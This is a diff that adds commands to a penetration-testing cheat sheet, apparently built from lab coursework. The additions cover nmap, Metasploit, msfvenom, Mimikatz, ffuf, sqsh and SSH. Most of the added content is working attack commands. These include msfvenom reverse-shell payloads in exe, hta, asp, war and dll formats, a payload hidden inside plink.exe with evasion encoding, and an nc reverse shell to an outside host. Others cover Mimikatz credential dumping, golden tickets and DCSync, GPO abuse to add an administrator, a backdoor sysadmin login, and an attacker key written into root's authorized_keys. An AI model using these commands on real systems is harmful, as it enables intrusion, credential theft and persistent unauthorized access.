@@ -72,7 +72,6 @@ A collection of **useful commands and scripts** for pentesting tools, organized 
   - [Man](#man)
   - [Masscan](#masscan)
   - [Medusa](#medusa)
-  - [Metasploit](#metasploit)
   - [Mimikatz](#mimikatz)
   - [Mingw-64](#mingw-64)
   - [Mklink](#mklink)
@@ -86,7 +85,6 @@ A collection of **useful commands and scripts** for pentesting tools, organized 
   - [Net](#net)
   - [Netsh](#netsh)
   - [Netstat](#netstat)
-  - [Nmap](#nmap)
   - [Nslookup](#nslookup)
   - [Onesixtyone](#onesixtyone)
   - [Openssl](#openssl)
@@ -261,6 +259,55 @@ cd cheatsheet-pentesting
   ```bash
   nmap -O <target-IP>
   ```
+- **Basic full TCP Connect Scan**:
+  ```bash
+  nmap -sT 10.11.1.220
+  ```
+- **Comprehensive Service Enumeration**:
+  ```bash
+  sudo nmap 10.11.0.128 -p- -sV -vv --open --reason
+  ```
+- **MSSQL-Specific Scan**:
+  ```bash
+  nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 -vvv -Pn 10.11.1.31
+  ```
+- **Host Discovery (Network Sweep)**:
+  ```bash
+  nmap -v -sn 10.11.1.1-254 -oG ping-sweep.txt
+  grep Up ping-sweep.txt | cut -d " " -f 2
+  ```
+- **Web Server Discovery**:
+  ```bash
+  nmap -p 80 10.11.1.1-254 -oG web-sweep.txt
+  grep open web-sweep.txt | cut -d" " -f2
+  ```
+- **Top Ports Scan**:
+  ```bash
+  nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt
+  ```
+- ** NSE OS Discovery**:
+  ```bash
+  nmap 10.11.1.220 --script=smb-os-discovery
+  ```
+- **DNS Zone Transfer**:
+  ```bash
+  nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com
+  ```
+- **Exploring Nmap Scripts**:
+  ```bash
+  cd /usr/share/nmap/scripts/
+  head -n 5 script.db
+  cat script.db | grep '"vuln"\|"exploit"'
+  ```
+- **Vulnerability Scanning**:
+  ```bash
+  nmap --script=smb-vuln\* 192.168.182.40
+  ```
+- **UDP Scanning**:
+  ```bash
+  nmap -T5 -sV -sU -vvv --open 10.129.27.254
+  ```
+
 ---
 ### Gobuster
 - **Directory Enumeration**:
@@ -288,20 +335,90 @@ cd cheatsheet-pentesting
   ```
 ---
 ### Metasploit
+- **Initializing the Metasploit Database**:
+  ```bash
+  sudo systemctl start postgresql
+  sudo systemctl enable postgresql
+  sudo msfdb init
+  ```
+
+- **Updating the Metasploit Framework**:
+  ```bash
+  sudo apt update; sudo apt install metasploit-framework
+  ```
+
 - **Start Metasploit Console**:
   ```bash
   msfconsole
   ```
 
+- **Search for Exploits: Searching SMB Modules**:
+  ```bash
+  search <exploit-name>
+  search type:auxiliary name:smb
+  ```
+
+- **Workspaces in Metasploit**:
+  ```bash
+  msf> workspace         # List workspaces
+  msf> workspace test    # Create/switch to a workspace named "test"
+  ```
+- **Staged vs Non-Staged Payload Syntax**:
+  ```bash
+  windows/shell/reverse_tcp    #Staged Payload
+  windows/shell_reverse_tcp    #Non-Staged Payload
+  ```
+  Staged Payload: Small payload that fetches the actual exploit in parts. Non-Staged Payload: Self-contained payload.
 - **Search for Exploits**:
   ```bash
   search <exploit-name>
   ```
 
-- **Use an Exploit**:
+- **Embedding a Payload in plink.exe**:
   ```bash
-  use <exploit-path>
+  msf> generate -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
   ```
+- **Multi/Handler Configuration**:
+  ```bash
+  msf> use multi/handler
+  msf> set payload windows/meterpreter/reverse_https
+  msf> set LHOST 192.168.118.2
+  msf> set LPORT 443
+  msf> exploit -j   # Run as a job
+  msf> jobs -i 0    # Interact with job ID 0
+  ```
+
+- **Advanced Multi/Handler Options: Enabling staged encoding for evasion:**:
+  ```bash
+  msf> show advanced
+  msf> set EnableStageEncoding true
+  msf> set StageEncoder x86/shikata_ga_nai
+  msf> set AutoRunScript windows/gather/enum_logged_on_users
+  ```
+- **Advanced Multi/Handler Options: Changing Meterpreter transports dynamically:**:
+  ```bash
+  meterpreter> transport list
+  meterpreter> transport add -t reverse_tcp -l 192.168.118.2 -p 5555
+  ```
+
+- **Automating Metasploit Execution**:
+  ```bash
+  sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.11.0.4; set LPORT 443; run"
+  ```
+- **Post-Exploitation with Incognito**:
+  ```bash
+  meterpreter > use incognito
+  meterpreter > list_tokens -u   # List available tokens (user)
+  meterpreter > impersonate_token sandbox\\Administrator
+  [+] Successfully impersonated user sandbox\Administrator
+  meterpreter > getuid
+  Server username: sandbox\Administrator
+  ```
+- **Automating Metasploit Execution**:
+  ```bash
+  sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.11.0.4; set LPORT 443; run"
+  ```
+
 ---
 ### Netcat
 - **Set Up a Listener**:
@@ -478,6 +595,21 @@ cd cheatsheet-pentesting
 - **Check for GPO Misconfigurations**:
   ```powershell
   SharpGPOAbuse.exe -gpo <gpo-name> -check
+  ```
+- **Executing SharpGPOAbuse to add a user account (tester) to the local Administrators group by specifying the GPO**:
+  ```powershell
+  SharpGPOAbuse.exe --AddLocalAdmin --UserAccount tester --GPOName "Default Domain Policy"
+  [+] Domain = vault.offsec
+  [+] Domain Controller = DC.test.local
+  [+] ...
+  [+] The GPO does not specify any group memberships.
+  [+] versionNumber attribute changed successfully
+  [+] The version number in GPT.ini was increased successfully.
+  [+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+  [+] Done!
+  --> updating the local Group Policy.
+  cmd> gpupdate /force
+  Updating policy...
   ```
 
 ---
@@ -1062,6 +1194,7 @@ cd cheatsheet-pentesting
 - **List Running Containers**:
   ```bash
   docker ps
+  docker container ls
   ```
 
 - **Run a Container**:
@@ -1072,6 +1205,42 @@ cd cheatsheet-pentesting
 - **Build Docker Image from Dockerfile**:
   ```bash
   docker build -t <image-name> .
+  ```
+- **Docker Help Commands**:
+  ```bash
+  docker --help
+  docker container run --help
+  ```
+
+- **Starting a Container with an Interactive Shell**:
+  ```bash
+  docker container run --interactive --tty --rm centos:7 /bin/bash
+  ```
+
+- **Mapping Ports (Host to Container)**:
+  ```bash
+  docker container run -d --rm -p 8080:80 httpd
+  curl localhost:8080
+  ```
+- **Executing a shell in a running container (e.g., container ID 899):**:
+  ```bash
+  docker exec -it 899 /bin/bash
+  ```
+
+- **Stop a running container:**:
+  ```bash
+  docker container stop 899
+  ```
+
+- **Mounting a Host Directory to a Container**:
+  ```bash
+  docker container run -d --rm -p 8080:80 -v /home/student/webroot/:/usr/local/apache2/htdocs/ httpd
+  curl localhost:8080
+  ```
+- **Starting a Container with Host Networking**:
+  ```bash
+  docker container run -d --rm --network host -v /home/student/webroot/:/usr/local/apache2/htdocs/ httpd
+  curl localhost
   ```
 
 ---
@@ -1154,6 +1323,42 @@ cd cheatsheet-pentesting
 - **Directory Bruteforce Scan**:
   ```bash
   ffuf -w <wordlist> -u http://<url>/FUZZ
+  ```
+
+- **Find Hidden DNS Subdomains**:
+  ```bash
+  ffuf -w <subdomain-wordlist> -u <domain>/FUZZ
+  ```
+- **Basic directory fuzzing using status code 200**:
+  ```bash
+  ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.11.1.229/FUZZ -mc 200
+  ```
+
+- **Using RAFT wordlist with colored output and SSL ignoring**:
+  ```bash
+  ffuf -k -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u "http://flower.pg/FUZZ"
+  ```
+- **Fuzzing URL Parameters**:
+  ```bash
+  ffuf -c -r -u 'http://192.168.124.212/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0
+  ```
+
+- **Fuzzing Subdomains**:
+  ```bash
+  ffuf -k -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://flower.pg/" -H "Host: FUZZ.flower.pg" -fw 105
+  ```
+- **Recursive Fuzzing**:
+  ```bash
+  ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -u http://IP:PORT/FUZZ -e .html -recursion -recursion-depth 2 -rate 500
+  ```
+
+- **POST Parameter Fuzzing**:
+  ```bash
+  ffuf -u http://IP:PORT/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -v
+  ```
+- **Additional Useful Options**:
+  ```bash
+  ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -u http://IP:PORT/FUZZ -e .html -rate 500 -timeout 5
   ```
 
 - **Find Hidden DNS Subdomains**:
@@ -1779,6 +1984,42 @@ cd cheatsheet-pentesting
 - **Export Credentials to a File**:
   ```cmd
   mimikatz "privilege::debug" "sekurlsa::logonpasswords" > credentials.txt
+  ```
+- **Running Mimikatz and elevate privileges:**:
+  ```cmd
+  mimikatz # privilege::debug
+  mimikatz # token::elevate
+  ```
+
+- **Extracting Kerberos tickets:**:
+  ```cmd
+  mimikatz # sekurlsa::tickets
+  ```
+- **Dumping Local SAM Database**:
+  ```cmd
+  mimikatz # lsadump::sam
+  ```
+
+- **Overpass-the-Hash (Pass-the-Hash)**:
+  ```cmd
+  mimikatz # sekurlsa::pth /user:tester /domain:test.com /ntlm:e2b4dasdfe0d87aa966c327 /run:PowerShell.exe
+  ```
+- **Pass-the-Ticket (Golden & Silver Tickets)**:
+  ```cmd
+  mimikatz # kerberos::purge
+  mimikatz # kerberos::list
+  
+  ```
+
+- **Golden Ticket Attack- Creating a Golden Ticket for a domain:**:
+  ```cmd
+  mimikatz # kerberos::golden /user:tester /domain:test.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:test.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327
+  ```
+- **Performing a DCSync attack to dump domain password hashes for users**:
+  ```cmd
+  mimikatz # lsadump::dcsync /user:Administrator
+  ```
+
 ---  
 ### MinGW-64
 - **Install the mingw-w64 cross-compiler in Kali Linux for building Windows binaries**:
@@ -1857,14 +2098,58 @@ cd cheatsheet-pentesting
   Disables file locking for NFS mounts, useful if the NFS server doesn't support or use locks.
 ---
 ### Msfvenom
-- **Generate a Reverse Shell Payload**:
+- **Generate a basic Reverse Shell Payload**:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f exe > payload.exe
   ```
 
-- **List Available Payloads**:
+- **List Available Payloads: List payload options**:
   ```bash
   msfvenom -l payloads
+  msfvenom -p linux/x86/shell_reverse_tcp --list-options
+  ```
+- **Exporting the payload as an ELF binary**:
+  ```bash
+  msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.48.2 LPORT=443 -f elf > shell.elf
+  ```
+
+- **Embeding the payload into an existing binary (plink.exe):**:
+  ```bash
+  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.2 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
+  ```
+- **Generate a Windows Meterpreter reverse shell**:
+  ```bash
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f exe > binary.exe
+  ```
+
+- **Generate Windows reverse shell payload with bad character filtering and encoding**:
+  ```bash
+  msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+  ```
+- **Buffer Overflow (BOF) Payload Example**:
+  ```bash
+  msfvenom -a x86 --platform Windows -p windows/exec CMD="cmd.exe" -f hex -b "\x00\x0a\x0d\x25\x26\x2b\x3d" > exploit3.txt
+  ```
+- **Generate HTA and PowerShell Payloads**:
+  ```bash
+  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
+  ```
+- **Generate a PowerShell-compatible payload:**:
+  ```bash
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell
+  ```
+- **Generate an ASP payload for IIS servers:**:
+  ```bash
+  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=443 -f asp -o evil.asp
+  ```
+- **Create a WAR (Web Application Archive) payload for Apache Tomcat:**:
+  ```bash
+  msfvenom -p java/shell_reverse_tcp LHOST=192.168.119.171 LPORT=443 -f war -o sh.war
+  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.99 LPORT=5566 -f raw -o shell.war
+  ```
+- **Generating SMBGhost Exploit Payload**:
+  ```bash
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.118.3 LPORT=8081 -f dll -f csharp
   ```
 ---
 ### MySQL
@@ -2795,6 +3080,58 @@ cd cheatsheet-pentesting
   ```bash
   sqsh -S <server> -U <username> -P <password>
   ```
+- **Basic Syntax:Using Windows Authentication (Local User):**:
+  ```bash
+  sqsh -S <IP> -U <Username> -P <Password> -D <Database>
+  sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
+  ```
+- **Running SQL Queries:**:
+  ```bash
+  sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
+  1> SELECT 1;
+  2> GO
+  ```
+
+- **Useful SQL Commands for Enumeration and Reconnaissance**:
+  ```bash
+  1> SELECT user_name();
+  2> GO
+  1> SELECT @@version;
+  2> GO
+  1> SELECT name FROM master.dbo.sysdatabases;
+  2> GO
+  1> USE master;
+  2> GO
+  1> SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
+  2> GO
+  ```
+- **List Linked Servers:**:
+  ```bash
+  1> EXEC sp_linkedservers;
+  2> GO
+  1> SELECT * FROM sys.servers;
+  2> GO
+  ```
+
+- **Listing Users and Login Details:**:
+  ```bash
+  1> SELECT sp.name AS login, sp.type_desc AS login_type, sl.password_hash, 
+       sp.create_date, sp.modify_date, 
+       CASE WHEN sp.is_disabled = 1 THEN 'Disabled' ELSE 'Enabled' END AS status 
+  FROM sys.server_principals sp 
+  LEFT JOIN sys.sql_logins sl 
+  ON sp.principal_id = sl.principal_id 
+  WHERE sp.type NOT IN ('G', 'R') 
+  ORDER BY sp.name;
+  2> GO
+  ```
+- ** Privilege Escalation: Creating a User with sysadmin**:
+  ```bash
+  1> CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!';
+  2> GO
+  1> sp_addsrvrolemember 'hacker', 'sysadmin';
+  2> GO
+  ```
 
 ### SSH
 - **Connect to a Server**:
@@ -2805,6 +3142,67 @@ cd cheatsheet-pentesting
 - **Run a Command Remotely**:
   ```bash
   ssh <username>@<host> <command>
+  ssh tester@10.11.1.101 'nc 192.168.119.174 443 -e /bin/bash'
+  ```
+- **SSH Local Port Forwarding**:
+  ```bash
+  ssh -N -L [bind_address:]port:host:hostport [username@address]
+  sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 tester@10.11.0.128
+  sudo ssh -N -L 0.0.0.0:445:Win-goal-ip:445 tester@victim-vm-ip
+  
+  ```
+
+- **SSH Remote Port Forwarding**:
+  ```bash
+  ssh -N -R [bind_address:]port:host:hostport [username@address]
+  ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
+  ssh -R 5555:localhost:5555 tester@192.168.166.52 -p 2222 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
+  
+  ```
+- **SSH Dynamic Port Forwarding (SOCKS Proxy)**:
+  ```bash
+  cat /etc/proxychains.conf --> add -->
+  [ProxyList]
+  # add proxy here ...
+  # meanwhile
+  # defaults set to "tor"
+  socks4 127.0.0.1 8080
+  ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
+  sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
+  --> sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
+  ```
+
+- **Windows-Specific Remote Port Forwarding**:
+  ```bash
+  ssh -R 1088 kali@ip --> SSH
+  ```
+- **SSH Key Management**:
+  ```bash
+  mkdir keys
+  cd keys
+  ssh-keygen
+  cat id_rsa.pub
+  ```
+
+- **Importing the Public Key with Restrictions**:
+  ```bash
+  from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMfLhjaHyhUr4auF+hSnF2g1hN4N2Z4DjkfZ9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8ZIo/ENC68Py+NhtW1c2So95ARwCa/Hkb7kZ1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T5/wJNcn8i12Lex/d02iOWCLGEav2V1R9xk87xVdI6h5BPySl35+ZXOrHzazbddS7MwGFz16coo+wbHbTR6P5fF9Z1Zm9O/US2LoqHxs7OxNq61BLtr4I/MDnin www-data@hostname
+
+  ```
+- **Secure Tunnel with the Attacker Machine**:
+  ```bash
+  ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
+  ```
+
+- ** Adding Public Key to Authorized Keys**:
+  ```bash
+  ssh-keygen
+  cat:~/.ssh/id_rsa.pub
+  echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali" > /root/.ssh/authorized_keys
+  ```
+- **Forcing Specific SSH Algorithms**:
+  ```bash
+  ssh -oKexAlgorithms=+diffie-hellman-group1-sha1,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss,ssh-rsa  tester@10.11.1.252 -p 22000 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
   ```
 
 ### Steghide
